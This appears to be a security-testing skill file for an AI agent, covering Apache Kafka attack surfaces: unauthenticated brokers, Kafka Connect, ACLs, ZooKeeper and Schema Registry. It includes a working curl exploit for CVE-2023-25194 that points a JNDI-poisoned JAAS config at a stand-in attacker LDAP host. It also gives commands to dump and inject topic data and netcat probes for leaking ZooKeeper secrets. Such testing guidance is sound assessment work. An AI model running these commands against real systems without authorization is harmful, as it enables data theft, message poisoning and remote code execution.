---
name: kafka
description: Apache Kafka security testing covering unauthenticated broker access, Kafka Connect REST API RCE via connector-class abuse, ACL misconfiguration, ZooKeeper/KRaft exposure, and schema registry data theft
---

# Kafka

Apache Kafka is a distributed event-streaming platform whose broker, Connect REST API, and schema registry are routinely deployed without authentication or authorization — exposing topic data (often containing PII, credentials, and financial events), cluster administration, and in the case of Connect, arbitrary class-loading that achieves RCE. This skill owns Kafka-specific surfaces: unauthenticated broker access, Kafka Connect REST API connector-class abuse, ACL misconfiguration, ZooKeeper and KRaft exposure, SASL/mTLS misconfig, and schema registry data theft. Java deserialization in Kafka message payloads routes to `insecure_deserialization`; RCE classification routes to `rce`; data exposure patterns reference `information_disclosure`.

## Attack Surface

- **Default ports:** 9092 (broker PLAINTEXT), 9093 (broker SSL/SASL), 2181 (ZooKeeper — legacy), 8083 (Connect REST API), 8081 (Schema Registry), 9021 (Confluent Control Center)
- **Broker protocol:** Kafka binary protocol over TCP — clients connect directly; no HTTP layer on the broker itself
- **Connect REST API:** HTTP (default no auth) — full CRUD on connectors, including connector class and configuration
- **Schema Registry:** HTTP (default no auth) — schema CRUD, subject listing, compatibility checks
- **ZooKeeper (legacy):** plaintext TCP, no auth by default — full cluster metadata, ACL storage, broker configs
- **KRaft (Kafka 3.3+ / 4.x):** replaces ZooKeeper with an internal Raft-based metadata quorum — removes ZK but does not add broker auth
- **Data exposure:** topic messages (application events, CDC streams, audit logs), consumer group offsets, cluster topology, connector configs (often containing database credentials)

## Reconnaissance

**Fingerprinting** (unauthenticated)
```
# Broker probe — TCP connection to 9092 + API version negotiation
kafka-topics.sh --bootstrap-server <target>:9092 --list
# Success = no auth; failure with "SASL" or "SSL" error = auth configured

# Cluster ID and broker metadata
kafka-metadata.sh --snapshot /dev/null --cluster-id  2>/dev/null
# Or via the AdminClient API:
kafka-broker-api-versions.sh --bootstrap-server <target>:9092

# Connect REST API
curl -s http://<target>:8083/
# Response: {"version":"...","commit":"...","kafka_cluster_id":"..."}
curl -s http://<target>:8083/connectors
curl -s http://<target>:8083/connector-plugins

# Schema Registry
curl -s http://<target>:8081/subjects
curl -s http://<target>:8081/schemas/types

# ZooKeeper (legacy — port 2181)
echo ruok | nc <target> 2181      # "imok" = alive, no auth
echo dump | nc <target> 2181      # session list, ephemeral nodes
```

Measured on Kafka 4.3.1 (Docker `apache/kafka:latest`, KRaft mode): `kafka-topics.sh --list` succeeds with no auth. Topic creation, message production, and consumption all work without credentials. `ACL LIST` returns `SecurityDisabledException: No Authorizer is configured on the broker`. The broker API exposes 30+ API versions including CreateTopics, DeleteTopics, Produce, Fetch, and CreateAcls — all unauthenticated.

## Key Vulnerabilities

### Unauthenticated Broker Access

Kafka ships with PLAINTEXT listeners and no authorizer by default. Measured on Kafka 4.3.1: the default `listener.security.protocol.map` is `PLAINTEXT:PLAINTEXT`, `authorizer.class.name` is empty, and `sasl.enabled.mechanisms` is `GSSAPI` (present but not active). Any TCP client can connect, list topics, create topics, produce messages, consume messages, describe configs, and enumerate consumer groups — no credentials, no ACLs.

KRaft mode (Kafka 3.3+, default in 4.x) eliminates ZooKeeper but does **not** add authentication or authorization. The migration is architectural, not a security improvement.

```
# Full topic inventory (including internal topics)
kafka-topics.sh --bootstrap-server <target>:9092 --list --exclude-internal
kafka-topics.sh --bootstrap-server <target>:9092 --list   # includes __consumer_offsets

# Read messages from a topic
kafka-console-consumer.sh --bootstrap-server <target>:9092 --topic <topic> --from-beginning --max-messages 100

# Produce a message (data injection / poisoning)
echo '{"event":"malicious"}' | kafka-console-producer.sh --bootstrap-server <target>:9092 --topic <topic>

# Describe cluster and broker configs
kafka-configs.sh --bootstrap-server <target>:9092 --describe --entity-type brokers --all

# List consumer groups → identify consuming applications
kafka-consumer-groups.sh --bootstrap-server <target>:9092 --list
kafka-consumer-groups.sh --bootstrap-server <target>:9092 --describe --group <group>
```

### Kafka Connect REST API — Connector-Class RCE

Kafka Connect's REST API (`:8083`) allows creating connectors that load arbitrary Java classes. Two CVE-backed attack classes:

**CVE-2023-25194** (CVSS 8.8) — JNDI injection via SASL JAAS configuration. When creating or modifying a connector, the attacker sets `sasl.jaas.config` to a JNDI-poisoned `LoginModule` class (e.g., `com.sun.security.auth.module.JndiLoginModule`). The Connect worker resolves the JNDI URL at connector startup, reaching an attacker-controlled LDAP/RMI server that returns a deserialization payload → RCE. Exploitable since Kafka 3.0.0 (when OAUTHBEARER SASL was added to Connect); mitigated in 3.4.0 via `sasl.login.connect.disallowed.login.modules`.

```
# Exploit — create a connector with a JNDI-poisoned SASL config
curl -X PUT http://<target>:8083/connectors/evil/config -H 'Content-Type: application/json' -d '{
  "connector.class": "org.apache.kafka.connect.mirror.MirrorSourceConnector",
  "tasks.max": "1",
  "topics": "test",
  "source.cluster.bootstrap.servers": "<target>:9092",
  "source.cluster.sasl.mechanism": "OAUTHBEARER",
  "source.cluster.security.protocol": "SASL_PLAINTEXT",
  "source.cluster.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://attacker:1389/exploit\" useFirstPass=true;"
}'
```

**CVE-2024-31141** (CVSS 6.5) — ConfigProvider plugins in Kafka clients/Connect allow file and directory access. A crafted connector configuration uses a ConfigProvider to read arbitrary files from the Connect worker's filesystem, exfiltrating secrets, keys, and configuration files.

**Connector-class abuse (no CVE — feature risk):** even without the JNDI vector, a Connect REST API with no auth lets the attacker deploy JDBC sink/source connectors that connect to attacker-controlled databases, or FileStream connectors that read/write files on the Connect worker. The connector-plugin list (`GET /connector-plugins`) shows available classes.

### ACL Misconfiguration

When `authorizer.class.name` is configured (e.g., `kafka.security.authorizer.AclAuthorizer` or `org.apache.kafka.metadata.authorizer.StandardAuthorizer` for KRaft), ACLs govern access. Common misconfigurations:
- **Wildcard resource ACLs:** `Topic:*` with `Read` or `Write` → any authenticated user accesses every topic.
- **Missing deny rules:** ACLs are additive (allow-only); a broad `Allow` on `User:*` effectively disables authorization.
- **Consumer group ACLs omitted:** topic-level ACLs enforced but consumer group access unrestricted → attacker joins any group, rebalancing disrupts legitimate consumers.
- **Cluster-level ACLs:** `Cluster:*` with `Alter` or `Create` → attacker creates topics, modifies configs, or adds ACLs.

**CVE-2024-27309** (CVSS 7.4) — ACL enforcement gap during ZooKeeper-to-KRaft migration. ACLs removed during the migration are not enforced until the migration completes, creating a window of unauthorized access.

### ZooKeeper Exposure (Legacy)

ZooKeeper (`:2181`) stores Kafka metadata, broker registrations, topic configs, ACLs, and consumer offsets (older versions). Default: no authentication, plaintext TCP.

```
# ZooKeeper four-letter commands
echo ruok | nc <target> 2181     # health check
echo dump | nc <target> 2181     # active sessions + ephemeral znodes
echo envi | nc <target> 2181     # JVM environment (may contain secrets in system properties)

# Full ZK tree traversal (zkCli.sh or zookeeper-shell.sh)
ls /brokers/ids                  # registered broker list
get /brokers/ids/0               # broker host:port, JMX port
ls /brokers/topics               # topic list
get /config/topics/<topic>       # topic-level config overrides
```

**CVE-2023-44981** (CVSS 9.1) — ZooKeeper SASL quorum peer authentication bypass via `instance` part manipulation. When ZooKeeper is configured with SASL authentication, an attacker can bypass peer verification by crafting a valid Kerberos instance identifier. Affects ZooKeeper-based Kafka deployments where ZK uses SASL.

### Schema Registry Data Theft

Confluent Schema Registry (`:8081`) stores Avro, Protobuf, and JSON schemas. Default: no authentication. Schemas reveal the exact structure of every Kafka message type — field names, types, default values, and documentation strings that describe the data model. This is a recon goldmine: it tells the attacker exactly what each topic contains and how to deserialize it.

```
curl -s http://<target>:8081/subjects                         # list all schema subjects
curl -s http://<target>:8081/subjects/<subject>/versions/latest  # latest schema
curl -s http://<target>:8081/schemas/ids/<id>                 # schema by global ID
```

## Testing Methodology

1. **Probe ports** — 9092 (broker), 8083 (Connect), 8081 (Schema Registry), 2181 (ZK). Determine which components are exposed.
2. **Auth check** — `kafka-topics.sh --list` on 9092; `curl` on 8083/8081. Success without creds = no auth.
3. **Topic inventory** — list all topics; consume messages from high-value topics (events with PII, CDC streams, audit logs, credential-bearing messages).
4. **Connect audit** — list connectors (`GET /connectors`), inspect configs (`GET /connectors/<name>/config`) for database credentials, then test connector creation (JNDI vector on Kafka <3.4.0).
5. **Schema Registry** — list subjects, pull schemas → map the data model → targeted topic consumption.
6. **ACL audit** — `kafka-acls.sh --list`; if `SecurityDisabledException`, no authorizer is configured.
7. **ZooKeeper** (if exposed) — four-letter commands, traverse `/brokers`, `/config`, `/admin`.
8. **Version + CVE mapping** — `kafka-broker-api-versions.sh` for broker version; Connect version from `GET /`; check CVE-2023-25194 (Connect <3.4.0), CVE-2024-27309 (migration window).

## Validation

1. Show unauthenticated topic listing and message consumption with the message content visible (redact PII in the report but confirm it is present).
2. Connect RCE: show the connector creation request, the JNDI callback on the attacker's server, and command execution on the Connect worker.
3. Data injection: show a message produced to a topic and consumed by a downstream application.
4. Schema Registry: show the schema response revealing field names and types.
5. ZooKeeper: show broker metadata and topic configs from ZK traversal.

## False Positives

- **Internal-only broker** behind a firewall with no external exposure — test from the application's network segment, not from the internet.
- **SASL/SSL configured** — the broker requires authentication; unauth access fails with a protocol error. Confirm the listener's security protocol before reporting.
- **Connect REST API not running** — the base Kafka image does not include Connect; a broker-only deployment has no Connect RCE surface. Measured: `apache/kafka:latest` does not expose port 8083.
- **KRaft mode** — eliminates ZooKeeper exposure but does not add broker auth; do not conflate KRaft migration with security improvement.
- **Managed Kafka services** (AWS MSK, Confluent Cloud, Azure Event Hubs) — broker auth is enforced by the provider; Connect and Schema Registry may still be exposed. Scope to the specific components accessible.
- **ACLs configured + authorizer present** — ACL enforcement is active; test with the credentials available to the assessment, not from an unauthenticated position.

## Impact

- Full topic read access → data theft (PII, financial events, credentials, CDC streams containing database changes).
- Topic write access → data injection/poisoning; downstream consumer applications process attacker-crafted messages.
- Kafka Connect RCE (CVE-2023-25194) → OS-level command execution on the Connect worker host.
- Connector config theft → database credentials, API keys, filesystem paths embedded in connector configurations.
- Consumer group manipulation → rebalancing disruption (DoS on consuming applications); consumer group offset reset → message replay or skip.
- Cluster administration → topic deletion (data destruction), config modification, ACL manipulation.
- Schema Registry → complete data-model disclosure, enabling targeted and precise data theft from topics.

## Pro Tips

1. `kafka-consumer-groups.sh --describe` reveals which applications are consuming which topics, their lag, and their assigned partitions — this is the application inventory.
2. Schema Registry schemas tell you exactly how to deserialize each topic — without them, binary Avro/Protobuf messages are opaque.
3. Connect connector configs often embed plaintext database credentials (`connection.url`, `connection.user`, `connection.password`) — inspect every connector.
4. The JNDI vector (CVE-2023-25194) does not require the attacker to know a valid topic or have broker access — Connect REST API access alone is sufficient.
5. ZooKeeper `envi` command may leak JVM system properties including secrets passed via `-D` flags.
6. Pair with `insecure_deserialization` for Java-serialized Kafka message payloads, `rce` for Connect RCE classification, `information_disclosure` for data exposure, and `weak_password_detection` for SASL credential brute-force.

## Summary

Kafka's default deployment — PLAINTEXT listeners, no authorizer, no ACLs — grants any TCP client full read/write/admin access to every topic and the cluster itself. Kafka Connect's REST API adds a second unauthenticated surface that enables RCE via connector-class abuse (CVE-2023-25194 JNDI injection). ZooKeeper (legacy) or an exposed KRaft metadata log adds a third. An exposed Kafka deployment is a data-theft, data-poisoning, and RCE finding — inventory the topics, consume high-value streams, audit Connect and Schema Registry, and chain to OS compromise where Connect is present.
